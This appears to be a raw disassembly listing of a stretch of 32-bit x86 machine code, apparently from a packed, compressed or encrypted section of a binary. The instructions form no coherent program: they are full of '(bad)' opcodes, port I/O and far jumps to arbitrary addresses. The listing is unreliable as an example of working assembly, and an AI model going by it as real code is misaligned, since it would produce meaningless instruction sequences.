  42380b:	dec    edx
  42380c:	sbb    al,0xeb
  42380e:	push   esi
  42380f:	push   ss
  423810:	in     eax,0x65
  423812:	inc    ebx
  423813:	bnd jae 0x423874
  423816:	add    al,0xb0
  423818:	jmp    0x99e4bce8
  42381d:	xor    DWORD PTR [eax+ebx*4],esi
  423820:	pop    esi
  423821:	pop    ds
  423822:	sbb    eax,0xc0db4d45
  423827:	and    DWORD PTR [edx+0x664ee2a5],eax
  42382d:	scas   al,BYTE PTR es:[edi]
  42382e:	retf   0x7ae9
  423831:	inc    eax
  423832:	adc    eax,0xdd0127fc
  423837:	test   al,0xd7
  423839:	and    bh,ah
  42383b:	in     al,0xd5
  42383d:	sbb    BYTE PTR [esi],cl
  42383f:	fld    TBYTE PTR [eax-0xab392f4]
  423845:	aaa    
  423846:	cld    
  423847:	jmp    0xc9c:0x4534fad4
  42384e:	and    DWORD PTR [eax],ebx
  423850:	(bad)  
  423851:	retf   
  423852:	mov    esp,0x157d58c
  423857:	pop    edi
  423858:	push   ebx
  423859:	and    eax,0xda646e0d
  42385e:	(bad)  [ecx+0xb67fa8e]
  423864:	ror    BYTE PTR [edi],1
  423866:	scas   eax,DWORD PTR es:[edi]
  423867:	and    BYTE PTR [edi-0x37],0x11
  42386b:	and    cl,BYTE PTR [ecx+0x50]
  42386e:	lods   al,BYTE PTR ds:[esi]
  42386f:	inc    ebx
  423870:	out    0x73,ax
  423873:	sbb    BYTE PTR [esi+esi*2],al
  423876:	outs   dx,WORD PTR ds:[esi]
  423878:	cmp    eax,0x74e41f59
  42387d:	push   edx
  42387e:	aaa    
  42387f:	mov    dl,0x1c
  423881:	retf   0x10bc
  423884:	pushf  
  423885:	adc    al,0x47
  423887:	imul   ebx,DWORD PTR [eax],0xffffffff
  42388a:	mov    DWORD PTR [edx],esp
  42388c:	lahf   
  42388d:	cli    
  42388e:	sub    DWORD PTR [edi+0x47cede20],esp
  423894:	mov    dh,0x5b
  423896:	pop    ss
  423897:	sub    al,0x45
  423899:	pop    ebp
  42389a:	arpl   WORD PTR [ecx],di
  42389c:	lods   eax,DWORD PTR ds:[esi]
  42389d:	inc    ebp
  42389e:	jne    0x423901
  4238a0:	(bad)  
  4238a1:	hlt    
  4238a2:	aam    0xb
  4238a4:	fwait
  4238a5:	shl    DWORD PTR [ebx],1
  4238a7:	push   ebx
  4238a8:	jae    0x4238dc
  4238aa:	push   cs
  4238ab:	pop    ds
  4238ac:	sbb    al,dl
  4238ae:	mov    ebx,DWORD PTR [edi]
  4238b0:	inc    esp
  4238b1:	inc    edi
  4238b2:	and    dh,BYTE PTR [edi+0x2f]
  4238b5:	ja     0x423854
  4238b7:	nop
  4238b8:	test   edx,esi
  4238ba:	ja     0x42389d
  4238bc:	lea    edi,[edi+0x19]
  4238bf:	es mov bl,0x45
  4238c2:	sub    eax,esi
  4238c4:	or     al,0x56
  4238c6:	stc    
  4238c7:	or     ecx,DWORD PTR [eax]
  4238c9:	pop    ebp
  4238ca:	adc    eax,0x2e
  4238cd:	lea    esp,[ecx-0x968d358]
  4238d3:	int3   
  4238d4:	push   0xffffffdd
  4238d6:	(bad)  
  4238d7:	xchg   ebx,eax
  4238d8:	xchg   edi,eax
  4238d9:	push   cs
  4238da:	sbb    edx,DWORD PTR [ecx+0x1d]
  4238dd:	jb     0x423919
  4238df:	push   esp
  4238e0:	cs cmp al,0x8b
  4238e3:	dec    ebp
  4238e4:	fisubr DWORD PTR [edx+0x5d]
  4238e7:	int    0xb
  4238e9:	pop    esp
  4238ea:	xor    eax,0x1040b370
  4238ef:	dec    edi
  4238f0:	xchg   esi,eax
  4238f1:	enter  0x3cda,0x88
  4238f5:	iret   
  4238f6:	jns    0x423909
  4238f8:	popf   
  4238f9:	and    eax,0x4029de48
  4238fe:	je     0x423935
  423900:	shl    BYTE PTR [eax+0x3d82f024],0x1b
  423907:	and    eax,0x9764abc6
  42390c:	mov    ebp,0x4d5fec0a
  423911:	mov    ah,0xde
  423913:	icebp  
  423914:	mov    edi,0xc0d3d388
  423919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42391a:	cmc    
  42391b:	jp     0x4238af
  42391d:	mov    dh,0xbd
  42391f:	div    DWORD PTR [esi-0x60f7f23e]
  423925:	inc    ebp
  423926:	lds    edi,FWORD PTR [ecx+esi*8]
  423929:	xor    dl,BYTE PTR [eax-0xfb51914]
  42392f:	call   0x41ee:0x9191a8d8
  423936:	or     BYTE PTR [ebx],0xcc
  423939:	or     BYTE PTR [ecx-0x52],bh
  42393c:	rcl    al,0x98
  42393f:	pop    ebx
  423940:	pop    ecx
  423941:	je     0x4239af
  423943:	mov    esi,0x73e81030
  423948:	mov    cl,0x6
  42394a:	daa    
  42394b:	icebp  
  42394c:	sar    BYTE PTR [edi],0x48
  42394f:	jo     0x42399f
  423951:	test   eax,0xa9156bf1
  423956:	adc    BYTE PTR [edi-0x6b116cf],dh
  42395c:	jne    0x4238e1
  42395e:	hlt    
  42395f:	sbb    dh,BYTE PTR [ebx+0x68]
  423962:	dec    ebx
  423963:	xchg   edx,eax
  423964:	aam    0xad
  423966:	push   cs
  423967:	xlat   BYTE PTR ds:[ebx]
  423968:	std    
  423969:	popa   
  42396a:	push   es
  42396b:	jae    0x4239ba
  42396d:	stc    
  42396e:	(bad)  
  42396f:	push   ds
  423970:	out    dx,eax
  423971:	imul   eax,DWORD PTR [eax+esi*8],0x8c2b9294
  423978:	ins    BYTE PTR es:[edi],dx
  423979:	pop    es
  42397a:	dec    edx
  42397b:	call   0xba16:0x45c44723
  423982:	sub    bh,cl
  423984:	pop    edi
  423985:	out    0xc8,al
  423987:	enter  0xbfef,0xa2
  42398b:	jmp    0x952e:0x6b48605d
  423992:	xchg   esi,eax
  423993:	out    0x6d,al
  423995:	mov    bh,0x51
  423997:	das    
  423998:	clc    
  423999:	adc    BYTE PTR [ebp-0x3c],0x3e
  42399d:	je     0x4239a1
  42399f:	in     eax,dx
  4239a0:	xchg   DWORD PTR [esi-0x3a9f2239],esi
  4239a6:	push   cs
  4239a7:	mov    al,ds:0x673d86b8
  4239ac:	dec    ebp
  4239ad:	mov    dl,0x27
  4239af:	xor    bh,BYTE PTR [ebx+0x69]
  4239b2:	lods   al,BYTE PTR ds:[esi]
  4239b3:	push   eax
  4239b4:	lock retf 
  4239b6:	fiadd  WORD PTR [edx+0x21956547]
  4239bc:	jns    0x4239b9
  4239be:	(bad)  
  4239c0:	scas   eax,DWORD PTR es:[edi]
  4239c1:	mov    ah,0x75
  4239c3:	das    
  4239c4:	in     eax,dx
  4239c5:	pop    edx
  4239c6:	mov    ds,WORD PTR ds:0xaa5a2547
  4239cc:	fiadd  WORD PTR [eax*4+0x4ef78812]
  4239d3:	mov    gs,WORD PTR [eax+0x6e]
  4239d6:	imul   esp,DWORD PTR [edi+0x5a8332d9],0xffffff99
  4239dd:	out    0x72,eax
  4239df:	inc    esi
  4239e0:	fcom   DWORD PTR [esi-0x3baca905]
  4239e6:	cmp    BYTE PTR ds:0x576eff92,al
  4239ec:	inc    ebx
  4239ed:	retf   0xdfe7
  4239f0:	xor    DWORD PTR [eax-0x5dcc777d],eax
  4239f6:	ja     0x4239bc
  4239f8:	fsub   st(7),st
  4239fa:	sbb    ah,BYTE PTR [edx+0x56]
  4239fd:	or     BYTE PTR [ebp+0x79c77631],bh
  423a03:	out    dx,eax
  423a04:	gs loopne 0x423a5a
  423a07:	je     0x423a24
  423a09:	jmp    DWORD PTR [ebp+eax*4+0x1eb43681]
  423a10:	jnp    0x423a24
  423a12:	adc    eax,0x48df61b0
  423a17:	fs mov ebp,0x490aa7f0
  423a1d:	test   al,0xd2
  423a1f:	mov    esp,0xdf1c5f07
  423a24:	jl     0x423a6a
  423a26:	jnp    0x423a7d
  423a28:	adc    ebp,ebx
  423a2a:	outs   dx,BYTE PTR ds:[esi]
  423a2b:	mov    ah,0xa1
  423a2d:	outs   dx,DWORD PTR ds:[esi]
  423a2e:	sub    BYTE PTR [esp+ecx*8+0x632981da],ah
  423a35:	call   0x3685:0xd830188a
  423a3c:	pop    ebp
  423a3d:	ins    DWORD PTR es:[edi],dx
  423a3e:	out    dx,al
  423a3f:	ss sbb al,0x84
  423a42:	ins    BYTE PTR es:[edi],dx
  423a43:	sar    BYTE PTR ds:0x87ef184d,1
  423a49:	mov    dh,0x90
  423a4b:	sbb    ecx,DWORD PTR ds:0x421b2484
  423a51:	push   0xa45797f6
  423a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a57:	or     dl,dh
  423a59:	lods   eax,DWORD PTR ds:[esi]
  423a5a:	jmp    0x5a4bac2b
  423a5f:	stc    
  423a60:	cmp    eax,DWORD PTR [ebx+0x37]
  423a63:	call   0xc970ee31
  423a68:	scas   eax,DWORD PTR es:[edi]
  423a69:	pop    ecx
  423a6a:	add    al,0x28
  423a6c:	and    eax,0x45e75176
  423a71:	xchg   ebx,eax
  423a72:	in     al,dx
  423a73:	push   0x9e506544
  423a78:	lldt   WORD PTR [esi+ebp*1]
  423a7c:	push   eax
  423a7d:	xchg   edi,eax
  423a7e:	nop
  423a7f:	jno    0x423a1b
  423a81:	or     eax,DWORD PTR [eax+edx*1+0x75]
  423a85:	inc    edx
  423a86:	ret    0x302b
  423a89:	pusha  
  423a8a:	mov    ch,BYTE PTR [edx]
  423a8c:	test   BYTE PTR es:[edx],al
  423a8f:	(bad)  
  423a90:	dec    edx
  423a91:	jmp    0x3c90:0x3489cc4
  423a98:	(bad)  
  423a99:	mov    al,0x76
  423a9b:	pop    ebx
  423a9c:	and    BYTE PTR ds:0x7c6baedc,bh
  423aa2:	fistp  DWORD PTR [ecx+0x5b]
  423aa5:	outs   dx,BYTE PTR ds:[esi]
  423aa6:	cmp    al,0x22
  423aa8:	jge    0x423a75
  423aaa:	aas    
  423aab:	push   edi
  423aac:	clc    
  423aad:	mov    ds:0xa6c063d2,eax
  423ab2:	mov    BYTE PTR [edi+ebp*1],dh
  423ab5:	mov    ecx,0xd3a29b45
  423aba:	lds    esp,FWORD PTR [eax]
  423abc:	and    BYTE PTR [esi],ah
  423abe:	inc    edx
  423abf:	int    0xa3
  423ac1:	call   FWORD PTR [edi]
  423ac3:	fcom   DWORD PTR [edi]
  423ac5:	aas    
  423ac6:	fnstcw WORD PTR [edi-0x4b]
  423ac9:	cmp    eax,0xe89f5bf1
  423ace:	scas   al,BYTE PTR es:[edi]
  423acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ad0:	aam    0x50
  423ad2:	cmp    eax,DWORD PTR [edi]
  423ad4:	test   DWORD PTR [edx-0xe33ad43],esp
  423ada:	imul   eax,edx,0xffffffd9
  423add:	and    DWORD PTR ds:[eax],ecx
  423ae0:	ret    0x3400
  423ae3:	fbld   TBYTE PTR [esi*4-0x637928a6]
  423aea:	fwait
  423aeb:	stc    
  423aec:	(bad)  
  423aed:	mov    al,ds:0xc1106225
  423af2:	aaa    
  423af3:	test   al,0x13
  423af5:	aaa    
  423af6:	in     al,0x23
  423af8:	pop    ax
  423afa:	and    BYTE PTR [ebx-0x6e],cl
  423afd:	push   es
  423afe:	adc    BYTE PTR [edx+0x3f8d7a8],ah
  423b04:	data16 sbb al,0x56
  423b07:	pop    es
  423b08:	popf   
  423b09:	mov    bl,0xdb
  423b0b:	adc    al,0x66
  423b0d:	in     eax,0x69
  423b0f:	jg     0x423b41
  423b11:	out    0xd5,eax
  423b13:	adc    DWORD PTR [edi],edx
  423b15:	test   al,0xc1
  423b17:	dec    edi
  423b18:	or     al,0x91
  423b1a:	scas   al,BYTE PTR es:[edi]
  423b1b:	add    eax,0x3158057e
  423b20:	fadd   DWORD PTR [esi-0x6c52e6f4]
  423b26:	sbb    bh,BYTE PTR [esi+edx*8-0x7098fd33]
  423b2d:	sbb    BYTE PTR [edi],dl
  423b2f:	sub    BYTE PTR [ecx-0x4a84a531],dl
  423b35:	scas   al,BYTE PTR es:[edi]
  423b36:	mov    dh,BYTE PTR [ebx+0x8]
  423b39:	fld    DWORD PTR [ecx]
  423b3b:	lahf   
  423b3c:	jmp    0x423ba5
  423b3e:	not    BYTE PTR [ebp+0x8e519c4]
  423b44:	icebp  
  423b45:	jbe    0x423ad4
  423b47:	loope  0x423b9c
  423b49:	iret   
  423b4a:	imul   esi,ecx,0x42
  423b4d:	cdq    
  423b4e:	xor    eax,0xa8933b2
  423b53:	push   cs
  423b54:	jbe    0x423b4a
  423b56:	cmp    ebx,DWORD PTR [eax-0x6479f705]
  423b5c:	push   ss
  423b5d:	rcr    BYTE PTR [ebx+0x6],cl
  423b60:	fxch   st(2)
  423b62:	loope  0x423bb2
  423b64:	and    edx,ebx
  423b66:	xlat   BYTE PTR ds:[ebx]
  423b67:	je     0x423afd
  423b69:	test   BYTE PTR [ebp-0x2b],0x6
  423b6d:	sahf   
  423b6e:	repnz repnz xlat BYTE PTR cs:[ebx]
  423b72:	shl    BYTE PTR ds:0xb11cce20,0xbb
  423b79:	ret    0x9035
  423b7c:	jne    0x423bf2
  423b7e:	and    ecx,DWORD PTR [edi-0x49726f0]
  423b84:	jae    0x423b89
  423b86:	dec    ebp
  423b87:	gs pop esp
  423b89:	mov    ch,BYTE PTR [ecx]
  423b8b:	xchg   edx,eax
  423b8c:	mov    ebx,0xd3e86e1e
  423b91:	cmp    edx,DWORD PTR [eax-0x1fb8c6b3]
  423b97:	arpl   WORD PTR [edi+0x11],cx
  423b9a:	and    edi,edx
  423b9c:	xchg   DWORD PTR [eax],ebp
  423b9e:	push   ebp
  423b9f:	mov    dh,BYTE PTR [esi]
  423ba1:	cmp    DWORD PTR [ecx+0x66],esp
  423ba4:	imul   eax,DWORD PTR [ebx+ecx*2],0xffffff9f
  423ba8:	push   edx
  423ba9:	jp     0x423b57
  423bab:	or     al,0xde
  423bad:	sub    ebx,esi
  423baf:	mov    al,ds:0x39471154
  423bb4:	loopne 0x423c2e
  423bb6:	lds    ebp,FWORD PTR [ecx+edx*8+0x7e]
  423bba:	icebp  
  423bbb:	sbb    eax,0xecb9d563
  423bc0:	xor    DWORD PTR [ecx],ecx
  423bc2:	dec    edx
  423bc3:	jb     0x423bae
  423bc5:	lea    esi,[ebx-0x10]
  423bc8:	mov    dl,0xdb
  423bca:	push   ebp
  423bcb:	iret   
  423bcc:	push   esp
  423bcd:	inc    edi
  423bce:	ror    edx,cl
  423bd0:	pop    eax
  423bd1:	not    BYTE PTR [eax-0x39]
  423bd4:	jg     0x423b7f
  423bd6:	xchg   esi,eax
  423bd7:	add    DWORD PTR [ebx+edx*4-0x48],esi
  423bdb:	test   eax,0x8e9502d5
  423be0:	fs push edx
  423be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423be3:	mov    ch,0x2c
  423be5:	pushf  
  423be6:	hlt    
  423be7:	pop    edi
  423be8:	mov    ebx,0x5438d785
  423bed:	dec    esp
  423bee:	mov    bh,0xe
  423bf0:	or     DWORD PTR [edi-0x49869921],ebp
  423bf6:	bound  esi,QWORD PTR [eax-0x1defa835]
  423bfc:	mov    cl,0x35
  423bfe:	inc    ecx
  423bff:	pop    ds
  423c00:	sbb    eax,0x8931fe86
  423c05:	stc    
  423c06:	gs loope 0x423c7d
  423c09:	jb     0x423bde
  423c0b:	mov    dl,0x9f
  423c0d:	(bad)  
  423c0e:	fdiv   st,st(7)
  423c10:	mov    al,al
  423c12:	das    
  423c13:	inc    edx
  423c14:	push   edi
  423c15:	push   ds
  423c16:	repz sub cl,BYTE PTR [ecx]
  423c19:	adc    DWORD PTR [esi-0x2d],eax
  423c1c:	pop    esi
  423c1d:	test   al,0x72
  423c1f:	cmp    ch,BYTE PTR [ebx-0x10668290]
  423c25:	pop    edx
  423c26:	pop    es
  423c27:	jnp    0x423be6
  423c29:	loopne 0x423bc9
  423c2b:	into   
  423c2c:	mov    ch,0x4
  423c2e:	pop    eax
  423c2f:	xchg   DWORD PTR [edi-0x41],ecx
  423c32:	xchg   edi,eax
  423c33:	push   edx
  423c34:	inc    DWORD PTR [ebx+0x69420203]
  423c3a:	aas    
  423c3b:	mov    ds,WORD PTR [ebx-0x529a2e7]
  423c41:	sub    eax,DWORD PTR [eax]
  423c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c44:	not    BYTE PTR [edi-0x38e44064]
  423c4a:	sbb    al,bl
  423c4c:	xor    DWORD PTR [esi],esp
  423c4e:	push   edi
  423c4f:	jmp    0x423bfb
  423c51:	cmp    cl,BYTE PTR [edi+0x78]
  423c54:	dec    ecx
  423c55:	jbe    0x423c6d
  423c57:	fwait
  423c58:	pushf  
  423c59:	not    DWORD PTR [ecx+0x6c]
  423c5c:	sti    
  423c5d:	rcr    DWORD PTR [ebx-0x48],0xc9
  423c61:	stc    
  423c62:	mov    eax,ds:0x72c6e33f
  423c67:	ror    DWORD PTR [esp+edi*8-0x5e3f5b64],cl
  423c6e:	mov    cl,0xa4
  423c70:	pop    es
  423c71:	shl    BYTE PTR [edx-0x75fdc97f],1
  423c77:	jmp    0x423cea
  423c79:	mov    ecx,0x6185afe8
  423c7e:	inc    ebx
  423c7f:	mov    al,ds:0xa7e32c0e
  423c84:	and    al,0x68
  423c86:	sbb    DWORD PTR [edx+eiz*1-0x33],edx
  423c8a:	sbb    bl,dh
  423c8c:	xor    eax,0xaf549a12
  423c91:	int3   
  423c92:	xor    dl,BYTE PTR [eax-0x36fd3ddd]
  423c98:	sti    
  423c99:	or     ebp,edi
  423c9b:	fstp   TBYTE PTR [ecx+0x4c]
  423c9e:	aad    0xc2
  423ca0:	mov    ds:0x6e31e525,al
  423ca5:	mov    ebx,0x2d187897
  423caa:	xor    DWORD PTR [edx+eiz*8],eax
  423cad:	adc    ebx,DWORD PTR [edi]
  423caf:	xor    al,0xa5
  423cb1:	xor    al,0x86
  423cb3:	mov    ebp,0xfb647f0e
  423cb8:	icebp  
  423cb9:	or     BYTE PTR [eax-0x12],ah
  423cbc:	push   ecx
  423cbd:	jecxz  0x423c77
  423cbf:	mov    ecx,0xae5b9796
  423cc4:	sbb    DWORD PTR [ecx-0x3d41bc6b],0xffffffeb
  423ccb:	dec    edx
  423ccc:	test   BYTE PTR [eax+eiz*1+0x14],ch
  423cd0:	test   al,0x6c
  423cd3:	sub    eax,0xda813055
  423cd8:	adc    al,0x71
  423cda:	retf   
  423cdb:	push   0xa7766449
  423ce0:	sbb    BYTE PTR [eax+0x33cdec2e],cl
  423ce6:	inc    esi
  423ce7:	mov    bl,0xc2
  423ce9:	sub    eax,DWORD PTR [esi]
  423ceb:	retf   
  423cec:	call   0xa3eb6ccd
  423cf1:	scas   al,BYTE PTR es:[edi]
  423cf2:	repnz (bad) 
  423cf6:	mov    al,ds:0x94f73b54
  423cfb:	cmc    
  423cfc:	iret   
  423cfd:	in     eax,0x74
  423cff:	shr    DWORD PTR [edx+0x1e],0x97
  423d03:	sti    
  423d04:	(bad)  
  423d05:	cmp    eax,0xd9430d32
  423d0a:	jns    0x423cac
  423d0c:	inc    edi
  423d0d:	mov    esp,0x74d861f7
  423d12:	jge    0x423d24
  423d14:	mov    dl,0xd0
  423d16:	mov    dl,0x7e
  423d18:	cmp    eax,0xa92f2cbc
  423d1d:	push   edx
  423d1e:	loop   0x423ccd
  423d20:	stc    
  423d21:	and    eax,DWORD PTR [edi+0x68]
  423d24:	pushf  
  423d25:	mov    DWORD PTR [edx],esp
  423d27:	loopne 0x423d41
  423d29:	mov    eax,0x11f73807
  423d2e:	cmp    DWORD PTR [ebx],edi
  423d30:	pop    esp
  423d31:	or     BYTE PTR [eax-0x78d49460],ah
  423d37:	sub    esi,DWORD PTR [edi-0x444f0e5]
  423d3d:	mov    eax,esi
  423d3f:	push   0x40bacf43
  423d44:	add    BYTE PTR [edx],bh
  423d46:	jecxz  0x423d3d
  423d48:	mov    ebx,0xac16ec10
  423d4d:	jo     0x423d2f
  423d4f:	push   ebp
  423d50:	clc    
  423d51:	mov    ebp,ecx
  423d53:	sub    dl,BYTE PTR [esi]
  423d55:	push   ecx
  423d56:	retf   0xc57a
  423d59:	arpl   WORD PTR ds:0x7dcdb94f,dx
  423d5f:	in     eax,0xe
  423d61:	push   ds
  423d62:	and    al,0x50
  423d64:	xlat   BYTE PTR ds:[ebx]
  423d65:	repz call 0xa3869fa5
  423d6b:	xchg   edi,eax
  423d6c:	pushf  
  423d6d:	mov    ah,0xae
  423d6f:	mov    ah,0xaf
  423d71:	or     al,0x20
  423d73:	(bad)  
  423d74:	push   eax
  423d75:	dec    ecx
  423d76:	mov    ecx,0x2b3960d
  423d7b:	dec    ebx
  423d7c:	test   BYTE PTR [esi+0x150dc52e],dl
  423d82:	aad    0x8d
  423d84:	sub    DWORD PTR [edx],0x78
  423d87:	popa   
  423d88:	leave  
  423d89:	push   ebp
  423d8a:	xchg   edx,eax
  423d8b:	inc    edi
  423d8c:	out    dx,al
  423d8d:	in     eax,dx
  423d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d8f:	cmp    BYTE PTR [edx+0x49],bh
  423d92:	or     bl,dh
  423d94:	push   ecx
  423d95:	in     eax,0xc
  423d97:	or     eax,DWORD PTR [esi]
  423d99:	jae    0x423d25
  423d9b:	jno    0x423d64
  423d9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d9e:	xchg   esp,eax
  423d9f:	sti    
  423da0:	sti    
  423da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423da2:	daa    
  423da3:	cmp    al,0xf9
  423da5:	stos   BYTE PTR es:[edi],al
  423da6:	dec    eax
  423da7:	dec    esi
  423da8:	repz gs pop ecx
  423dab:	retf   0xf951
  423dae:	stc    
  423daf:	mov    bl,0xb
  423db1:	(bad)  
  423db2:	cmp    al,0x4c
  423db4:	mov    cl,0xa8
  423db6:	mov    al,ds:0xe0507241
  423dbb:	lds    ecx,FWORD PTR [eax]
  423dbd:	hlt    
  423dbe:	xor    ah,0xb7
  423dc1:	jmp    0x1295723
  423dc6:	mov    edi,0xeb1f8fba
  423dcb:	sub    BYTE PTR [edx-0x307c018e],bl
  423dd1:	and    DWORD PTR [esi],0x15
  423dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dd5:	xor    ebx,eax
  423dd7:	jae    0x423e30
  423dd9:	sbb    eax,0x99af8a82
  423dde:	jp     0x423dff
  423de0:	or     esp,DWORD PTR [edi]
  423de2:	cdq    
  423de3:	xchg   edx,eax
  423de4:	adc    eax,0xfbce5d39
  423de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dea:	jmp    0x5a4a:0xfbcda019
  423df1:	mov    eax,ds:0xb22b6371
  423df6:	lods   eax,DWORD PTR ds:[esi]
  423df7:	aas    
  423df8:	arpl   bx,cx
  423dfa:	gs xchg ecx,eax
  423dfc:	xchg   ebp,eax
  423dfd:	cs aaa 
  423dff:	daa    
  423e00:	sub    ebx,ecx
  423e02:	dec    ebp
  423e03:	add    eax,0x69e66888
  423e08:	ja     0x423e08
  423e0a:	out    0x10,eax
  423e0c:	jnp    0x423e73
  423e0e:	or     DWORD PTR [ebx+0x62a57394],edi
  423e14:	mov    BYTE PTR [edx],dl
  423e16:	leave  
  423e17:	fisub  DWORD PTR [ebx+0x28]
  423e1a:	outs   dx,BYTE PTR ds:[esi]
  423e1b:	mov    esp,0x119d8
  423e20:	push   edi
  423e21:	imul   edi,DWORD PTR [ecx+0x5413ede6],0x709e245f
  423e2b:	dec    esi
  423e2c:	pop    ebp
  423e2d:	push   esi
  423e2e:	adc    al,0x10
  423e30:	sub    eax,DWORD PTR [edx+0x2c27eac2]
  423e36:	lahf   
  423e37:	sahf   
  423e38:	ds jmp 0x75e7:0xd8ab51c9
  423e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e41:	push   esp
  423e42:	cwde   
  423e43:	pop    eax
  423e44:	mov    BYTE PTR [eax-0x523475cf],0xe0
  423e4b:	jno    0x423e20
  423e4d:	pop    edi
  423e4e:	inc    esi
  423e4f:	mov    ds:0xd5fa86bf,eax
  423e54:	mov    esp,0xa4385e06
  423e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e5a:	cdq    
  423e5b:	and    al,0xd2
  423e5d:	loope  0x423e84
  423e5f:	pop    esi
  423e60:	xchg   edi,eax
  423e61:	jmp    0xe87487fb
  423e66:	stos   DWORD PTR es:[edi],eax
  423e67:	push   edi
  423e68:	cmp    eax,0xb86499f
  423e6d:	push   esi
  423e6e:	push   0xffffff8d
  423e70:	inc    ebx
  423e71:	mov    dl,0xd8
  423e73:	push   ebp
  423e74:	inc    esi
  423e75:	and    dh,BYTE PTR [ecx-0x4384be39]
  423e7b:	aad    0x5d
  423e7d:	mov    ch,ch
  423e7f:	(bad)  [ebx+ecx*1-0x534ec31d]
  423e86:	pop    ecx
  423e87:	(bad)  
  423e88:	inc    edi
  423e89:	mov    BYTE PTR [ebx+0x0],ch
	...
  423ea7:	add    BYTE PTR [eax],al
  423ea9:	add    BYTE PTR [edx+edx*2+0x57],al
  423ead:	push   ebp
  423eae:	push   edi
  423eaf:	push   ebp
  423eb0:	inc    esi
  423eb1:	push   ebx
  423eb2:	test   BYTE PTR [eax+0x1a69fe6e],ah
  423eb8:	xchg   esp,eax
  423eb9:	and    BYTE PTR [ebx+ecx*8+0x6890001],bh
  423ec0:	add    BYTE PTR [eax],al
  423ec2:	std    
  423ec3:	scas   eax,DWORD PTR es:[edi]
  423ec4:	pop    ds
  423ec5:	and    BYTE PTR [eax-0x55158866],ch
  423ecb:	out    0xe8,al
  423ecd:	je     0x423ef4
  423ecf:	les    edx,FWORD PTR ds:0x81cc1c01
  423ed5:	or     eax,0xbc5e39ed
  423eda:	xchg   esi,eax
  423edb:	clc    
  423edc:	gs adc ch,bh
  423edf:	and    al,0x28
  423ee1:	stc    
  423ee2:	xor    DWORD PTR [edi],0xffffff9f
  423ee5:	pop    ecx
  423ee6:	push   cs
  423ee7:	cld    
  423ee8:	and    dh,BYTE PTR [esi+0x79a336f8]
  423eee:	adc    BYTE PTR [ecx-0x9996c86],0xd7
  423ef5:	xchg   BYTE PTR [edi-0x3b7c6d0a],dh
  423efb:	ror    DWORD PTR [ebx+0x7f4b1c6e],cl
  423f01:	in     eax,dx
  423f02:	pop    ebp
  423f03:	jmp    0x423eb3
  423f05:	inc    esp
  423f06:	popf   
  423f07:	jnp    0x423ef2
  423f09:	dec    ebp
  423f0a:	inc    esi
  423f0b:	jb     0x423eb0
  423f0d:	retf   
  423f0e:	scas   al,BYTE PTR es:[edi]
  423f0f:	in     eax,dx
  423f10:	jns    0x423ee6
  423f12:	mov    ds,edx
  423f14:	jle    0x423f7c
  423f16:	pop    ds
  423f17:	xchg   edx,eax
  423f18:	enter  0xc314,0x1b
  423f1c:	lods   al,BYTE PTR ds:[esi]
  423f1d:	pop    esi
  423f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f1f:	push   ss
  423f20:	mov    WORD PTR [ecx-0x233009f8],?
  423f26:	jp     0x423ec7
  423f28:	and    DWORD PTR [eax],esp
  423f2a:	call   0xa194:0x3ccb414d
  423f31:	cs (bad) 
  423f33:	out    0x18,eax
  423f35:	hlt    
  423f36:	xchg   BYTE PTR [edi],al
  423f38:	out    0xe3,eax
  423f3a:	shr    ebp,1
  423f3c:	imul   esi,DWORD PTR [edx-0x571eaff0],0x6a
  423f43:	xor    eax,0x4ec9fab4
  423f48:	retf   
  423f49:	or     esi,edx
  423f4b:	ja     0x423f44
  423f4d:	dec    ecx
  423f4e:	in     al,dx
  423f4f:	and    eax,0xe45cc048
  423f54:	jecxz  0x423f0e
  423f56:	outs   dx,BYTE PTR ds:[esi]
  423f57:	clc    
  423f58:	test   eax,0x4c63b826
  423f5d:	sbb    BYTE PTR [ecx-0x3e],0x96
  423f61:	outs   dx,DWORD PTR ds:[esi]
  423f62:	ins    DWORD PTR es:[edi],dx
  423f63:	xor    BYTE PTR [ebp+eax*2+0x3a],0x10
  423f68:	add    BYTE PTR [edi-0x40],dh
  423f6b:	int    0x7a
  423f6d:	retf   
  423f6e:	add    ch,dl
  423f70:	aad    0x29
  423f72:	adc    DWORD PTR [esi],edi
  423f74:	aad    0x24
  423f76:	inc    esp
  423f77:	mov    ebx,0xaa2e09c
  423f7c:	jge    0x423f90
  423f7e:	jge    0x423fb5
  423f80:	push   ss
  423f81:	out    0x3a,al
  423f83:	sub    eax,0x3a5dfec4
  423f88:	fwait
  423f89:	xor    DWORD PTR [edx-0x56],esp
  423f8c:	ret    
  423f8d:	cli    
  423f8e:	lea    ebx,[edi]
  423f90:	shr    DWORD PTR [eax],0xd7
  423f93:	retf   0xfef7
  423f96:	out    dx,eax
  423f97:	dec    ecx
  423f98:	mov    esp,0xec33659b
  423f9d:	cdq    
  423f9e:	int3   
  423f9f:	fs jp  0x423f7d
  423fa2:	aam    0x22
  423fa4:	adc    edx,DWORD PTR [ecx-0x55]
  423fa7:	in     al,0x2c
  423fa9:	addr16 loop 0x423fa6
  423fac:	imul   edx,DWORD PTR [ebp-0x60967d01],0x2
  423fb3:	fiadd  WORD PTR ds:0x7421c193
  423fb9:	stos   DWORD PTR es:[edi],eax
  423fba:	dec    ecx
  423fbb:	ja     0x424002
  423fbd:	sbb    BYTE PTR [edi-0x26bbd02d],cl
  423fc3:	sub    al,0xc9
  423fc5:	xchg   DWORD PTR [ecx+0x15a0c849],edx
  423fcb:	repnz push ds
  423fcd:	in     al,0x9c
  423fcf:	mov    bh,0xb
  423fd1:	push   cs
  423fd2:	leave  
  423fd3:	(bad)  
  423fd5:	inc    ebx
  423fd6:	les    ebx,FWORD PTR [ecx+edi*4]
  423fd9:	mov    ecx,cs
